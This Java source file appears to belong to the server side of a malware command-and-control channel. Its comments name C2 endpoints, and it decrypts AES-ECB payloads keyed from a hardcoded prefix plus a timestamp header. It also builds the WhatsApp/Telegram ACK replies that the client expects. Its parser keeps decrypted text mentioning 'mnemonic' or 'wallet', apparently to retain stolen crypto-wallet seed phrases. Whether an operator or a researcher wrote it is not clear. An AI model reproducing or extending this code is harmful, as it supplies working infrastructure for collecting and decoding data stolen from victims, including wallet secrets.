package com.report.util;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONException;
import com.alibaba.fastjson.JSONObject;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/**
 * AES-ECB 解密 C2 /a /event 等 outer payload（与 news2 decrypt_event 一致）。
 * 密钥 = sha256(Ek8pl31K2yeHgQwy + x-ts)。
 */
public final class EventDecryptor {

    public static final String EVENT_KEY_PREFIX = "Ek8pl31K2yeHgQwy";

    private static final String AES_ALG = "AES";
    private static final String AES_ECB_PKCS5 = "AES/ECB/PKCS5Padding";
    private static final String AES_ECB_NO_PAD = "AES/ECB/NoPadding";
    private static final String SHA_256 = "SHA-256";

    private EventDecryptor() {
    }

    /**
     * SHA-256 派生密钥
     */
    public static byte[] deriveKey(String s) {
        try {
            MessageDigest md = MessageDigest.getInstance(SHA_256);
            return md.digest(s.getBytes(StandardCharsets.UTF_8));
        } catch (NoSuchAlgorithmException e) {
            return null;
        }
    }

    /**
     * WhatsApp / Telegram ACK：明文 = 请求 x-ts + "{}"，
     * 密钥 = sha256(prefix + 请求 x-ts)，AES-256-ECB-PKCS7，返回标准 Base64。
     * 客户端只要求解密后是合法 JSON，不读字段。
     */
    public static String encryptAck(String xTs) {
        String ts = xTs == null ? "" : xTs.trim();
        byte[] key = deriveKey(EVENT_KEY_PREFIX + ts);
        if (key == null) {
            return null;
        }
        try {
            Cipher cipher = Cipher.getInstance(AES_ECB_PKCS5);
            cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, AES_ALG));
            byte[] ct = cipher.doFinal((ts + "{}").getBytes(StandardCharsets.UTF_8));
            return Base64.getEncoder().encodeToString(ct);
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * AES-ECB 解密（PKCS7 去填充）
     */
    public static byte[] decryptEcb(byte[] blob, byte[] key) {
        if (blob == null || blob.length < 16 || blob.length % 16 != 0) {
            return null;
        }
        try {
            Cipher cipher = Cipher.getInstance(AES_ECB_PKCS5);
            cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, AES_ALG));
            return cipher.doFinal(blob);
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * 解析明文：定位首个 {，截取前缀与 JSON 体
     */
    public static Map<String, Object> parsePlaintext(byte[] pt, String keyLabel) {
        if (pt == null) {
            return null;
        }
        String text;
        try {
            text = new String(pt, StandardCharsets.UTF_8);
        } catch (Exception e) {
            return null;
        }

        int jsonStart = text.indexOf("{");
        String prefix = jsonStart > 0 ? text.substring(0, jsonStart) : "";
        String body = jsonStart >= 0 ? text.substring(jsonStart) : text;

        Map<String, Object> result = new HashMap<>();
        result.put("key", keyLabel);
        result.put("prefix", prefix);

        try {
            JSONObject obj = JSON.parseObject(body);
            result.put("plaintext", obj);
            result.put("raw", text);
            return result;
        } catch (JSONException ex) {
            String first = text.isEmpty() ? "" : text.substring(0, 1);
            if ("{".equals(first) || "[".equals(first)
                    || text.contains("mnemonic") || text.contains("wallet")) {
                result.put("plaintext", null);
                result.put("raw", text);
                return result;
            }
        }
        return null;
    }

    /**
     * 尝试以 x_ts 派生密钥解密 ECB
     */
    public static Map<String, Object> tryDecryptEventEcb(byte[] blob, String xTs) {
        return tryDecryptEventEcb(blob, xTs, EVENT_KEY_PREFIX);
    }

    public static Map<String, Object> tryDecryptEventEcb(byte[] blob, String xTs, String prefix) {
        if (prefix == null || prefix.isEmpty()) {
            prefix = EVENT_KEY_PREFIX;
        }
        String keyStr = prefix + (xTs == null ? "" : xTs);
        byte[] key = deriveKey(keyStr);
        if (key == null) {
            return null;
        }
        byte[] pt = decryptEcb(blob, key);
        if (pt == null) {
            return null;
        }
        return parsePlaintext(pt, keyStr);
    }

    /**
     * 解密 C2 接口 body（base64 文本 → 明文）
     */
    public static Map<String, Object> decryptEventBody(String xTs, String b64Text) {
        return decryptEventBody(xTs, b64Text, EVENT_KEY_PREFIX);
    }

    public static Map<String, Object> decryptEventBody(String xTs, String b64Text, String prefix) {
        Map<String, Object> out = new HashMap<>();
        out.put("success", false);
        out.put("x_ts", xTs == null ? "" : xTs);
        out.put("key_label", "");
        out.put("prefix", "");
        out.put("plaintext", null);
        out.put("raw", "");
        out.put("error", "");

        if (xTs == null || xTs.isEmpty() || b64Text == null || b64Text.isEmpty()) {
            out.put("error", "missing x-ts or body");
            return out;
        }

        try {
            byte[] blob = Base64.getDecoder().decode(b64Text.trim().replace(" ", ""));
            Map<String, Object> hit = tryDecryptEventEcb(blob, xTs, prefix);
            if (hit == null) {
                out.put("error", "AES-ECB decrypt failed");
                return out;
            }
            out.put("success", true);
            out.put("key_label", asString(hit.get("key")));
            out.put("prefix", asString(hit.get("prefix")));
            out.put("plaintext", hit.get("plaintext"));
            out.put("raw", asString(hit.get("raw")));
            return out;
        } catch (Exception e) {
            out.put("error", e.getMessage() == null ? e.toString() : e.getMessage());
            return out;
        }
    }

    private static String asString(Object o) {
        return o == null ? "" : o.toString();
    }

    /**
     * /api/wp/t、/api/tg/t 测试解密：明文 = trim(x-ts) + JSON。
     * 密文截断时用 NoPadding 解完整块，返回可读明文（可能是半截 JSON）。
     */
    public static String decryptWpTgRaw(String xTs, byte[] bodyBytes) {
        String ts = xTs == null ? "" : xTs.trim();
        if (ts.isEmpty() || bodyBytes == null || bodyBytes.length == 0) {
            return null;
        }
        Map<String, Object> hit = tryDecryptWpTg(bodyBytes, ts);
        if (hit == null) {
            try {
                hit = tryDecryptWpTg(new String(bodyBytes, StandardCharsets.UTF_8).getBytes(StandardCharsets.ISO_8859_1), ts);
            } catch (Exception ignore) {
                hit = null;
            }
        }
        if (hit == null) {
            return null;
        }
        String raw = asString(hit.get("raw"));
        return raw.isEmpty() ? null : raw;
    }

    private static Map<String, Object> tryDecryptWpTg(byte[] blob, String trimmedTs) {
        if (blob == null || blob.length < 16) {
            return null;
        }
        if (blob.length % 16 != 0 || looksLikeBase64Text(blob)) {
            try {
                String s = stripAllWhitespace(new String(blob, StandardCharsets.UTF_8));
                byte[] decoded = decodeBase64Lenient(s);
                Map<String, Object> hit = tryDecryptWpTgEcb(decoded, trimmedTs);
                if (hit != null) {
                    return hit;
                }
            } catch (Exception ignore) {
                // 继续按裸密文试
            }
        }
        return tryDecryptWpTgEcb(blob, trimmedTs);
    }

    private static Map<String, Object> tryDecryptWpTgEcb(byte[] blob, String trimmedTs) {
        byte[] key = deriveKey(EVENT_KEY_PREFIX + (trimmedTs == null ? "" : trimmedTs));
        if (key == null) {
            return null;
        }
        byte[] pt = decryptEcbAllowTruncated(blob, key);
        if (pt == null) {
            return null;
        }
        String text = new String(pt, StandardCharsets.UTF_8);
        if (text.indexOf('{') < 0 && !text.startsWith(trimmedTs == null ? "" : trimmedTs)) {
            return null;
        }
        Map<String, Object> result = new HashMap<>();
        result.put("raw", text);
        return result;
    }

    private static byte[] decryptEcbAllowTruncated(byte[] blob, byte[] key) {
        if (blob == null || blob.length < 16) {
            return null;
        }
        int n = blob.length - (blob.length % 16);
        if (n < 16) {
            return null;
        }
        byte[] aligned = blob;
        if (n != blob.length) {
            aligned = new byte[n];
            System.arraycopy(blob, 0, aligned, 0, n);
        }
        byte[] pt = decryptEcb(aligned, key);
        if (pt != null) {
            return pt;
        }
        try {
            Cipher cipher = Cipher.getInstance(AES_ECB_NO_PAD);
            cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, AES_ALG));
            return cipher.doFinal(aligned);
        } catch (Exception e) {
            return null;
        }
    }

    private static byte[] decodeBase64Lenient(String cleaned) {
        if (cleaned == null || cleaned.isEmpty()) {
            throw new IllegalArgumentException("empty base64");
        }
        String s = cleaned;
        int mod = s.length() % 4;
        if (mod == 1) {
            s = s.substring(0, s.length() - 1);
            mod = s.length() % 4;
        }
        if (mod > 0) {
            StringBuilder sb = new StringBuilder(s);
            for (int i = 0; i < 4 - mod; i++) {
                sb.append('=');
            }
            s = sb.toString();
        }
        try {
            return Base64.getDecoder().decode(s);
        } catch (IllegalArgumentException e) {
            return Base64.getUrlDecoder().decode(s);
        }
    }

    private static boolean looksLikeBase64Text(byte[] blob) {
        int n = Math.min(blob.length, 64);
        int ok = 0;
        for (int i = 0; i < n; i++) {
            byte b = blob[i];
            if ((b >= 'A' && b <= 'Z') || (b >= 'a' && b <= 'z')
                    || (b >= '0' && b <= '9') || b == '+' || b == '/' || b == '='
                    || b == '-' || b == '_' || b == '\r' || b == '\n' || b == ' ') {
                ok++;
            }
        }
        return ok * 10 >= n * 9;
    }

    private static String stripAllWhitespace(String s) {
        if (s == null || s.isEmpty()) {
            return "";
        }
        StringBuilder sb = new StringBuilder(s.length());
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (!Character.isWhitespace(c)) {
                sb.append(c);
            }
        }
        return sb.toString();
    }
}
